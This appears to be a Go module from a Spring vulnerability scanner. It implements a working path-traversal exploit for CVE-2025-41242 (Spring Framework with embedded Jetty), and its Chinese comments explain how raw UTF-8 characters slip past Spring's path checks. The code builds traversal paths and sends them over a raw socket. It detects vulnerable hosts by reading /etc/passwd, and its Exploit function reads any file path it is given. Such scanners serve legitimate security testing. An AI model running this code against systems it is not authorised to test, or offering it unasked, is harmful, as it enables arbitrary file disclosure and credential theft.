package vulns

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/sspsec/Scan-Spring-GO/internal/client"
	"github.com/sspsec/Scan-Spring-GO/internal/model"
)

// CVE-2025-41242 Spring Framework + 内嵌 Jetty 路径穿越（Ghost Bits）。
//
// Spring 的 StringUtils.uriDecode 在解码非 %xy 字符时丢失 char 高 8 位：
// 原始 UTF-8 字节的 "阮严灵丰丰甲来" 被静默解码为 ".%u002e"，绕过 Spring
// 的路径安全检查后，Jetty 又将 %u002e 解释为 "."，使 "/.%u002e/" 在文件
// 系统层面变成 "/../"，完成任意文件读取。
//
// 请求约束（与官方 PoC 一致）：
//  1. 幽灵段必须以原始 UTF-8 字节出现在请求行中——curl/Burp 等工具会
//     自动 percent-encode 而破坏触发条件，因此本模块走 RawHTTPRaw；
//  2. 目标文件名至少一个字节做 percent-encoding，否则 Spring 的路径
//     匹配会短路，不会进入有缺陷的解码逻辑。
type cve202541242 struct{}

func init() { Register(&cve202541242{}) }

// ghostSeg 触发 Ghost Bits 的中文字符段（解码后为 .%u002e）。
const ghostSeg = "阮严灵丰丰甲来/"

func (c *cve202541242) Info() model.Info {
	return model.Info{
		ID:         "CVE-2025-41242",
		Name:       "Spring Framework + Jetty 路径穿越（Ghost Bits）",
		Type:       "FileRead",
		Severity:   "high",
		Affected:   "spring-webmvc 5.3.0-5.3.43 / 6.0.0-6.0.29 / 6.1.0-6.1.21 / 6.2.0-6.2.9（内嵌 Jetty 12）",
		Reference:  "https://github.com/advisories/GHSA-r936-gwx5-v52f",
		HasExploit: true,
		ArgHint:    "要读取的文件绝对路径（文件名最后一个字符须为 ASCII）",
	}
}

// ghostPath 构造穿越路径：幽灵段 ×7 + 末字节 percent-encode 的目标文件。
func ghostPath(file string) (string, error) {
	p := strings.TrimPrefix(file, "/")
	if p == "" {
		return "", fmt.Errorf("文件路径不能为空")
	}
	last := p[len(p)-1]
	if last > 0x7e {
		return "", fmt.Errorf("文件名最后一个字符必须为 ASCII")
	}
	return "/" + strings.Repeat(ghostSeg, 7) + p[:len(p)-1] + fmt.Sprintf("%%%02x", last), nil
}

// rawGet 用原始 socket 发送穿越请求（头名与路径字节均逐字保真）。
func (c *cve202541242) rawGet(ctx context.Context, t model.Target, file string) (int, []byte, error) {
	path, err := ghostPath(file)
	if err != nil {
		return 0, nil, err
	}
	u, err := url.Parse(t.URL)
	if err != nil {
		return 0, nil, err
	}
	return client.RawHTTPRaw(ctx, t.Proxy, http.MethodGet, u.Host, u.Scheme == "https", path, nil, "")
}

func (c *cve202541242) Detect(ctx context.Context, t model.Target) (*model.Verdict, error) {
	v := &model.Verdict{ID: c.Info().ID, Name: c.Info().Name, Target: t.URL}

	code, body, err := c.rawGet(ctx, t, "/etc/passwd")
	if err != nil {
		// 非 HTTP/目标拒收原始字节请求等情况，静默判负
		v.Detail = "原始请求失败：" + err.Error()
		return v, nil
	}
	if code == http.StatusOK && strings.Contains(string(body), "root:x:") {
		v.Vulnerable = true
		v.Evidence = "Ghost Bits 路径穿越成功读取 /etc/passwd"
		v.Detail = "Spring 与 Jetty 的 URI 解码不一致，支持任意文件读取（Exploit 指定路径）"
	}
	return v, nil
}

// Exploit 的 arg 为要读取的文件绝对路径。
func (c *cve202541242) Exploit(ctx context.Context, t model.Target, arg string) (string, string, error) {
	code, body, err := c.rawGet(ctx, t, arg)
	if err != nil {
		return "", "", err
	}
	if code != http.StatusOK {
		return "", fmt.Sprintf("目标返回状态码 %d，文件可能不存在或目标不受影响", code), nil
	}
	if len(strings.TrimSpace(string(body))) == 0 {
		return "", "响应体为空", nil
	}
	return string(body), "", nil
}
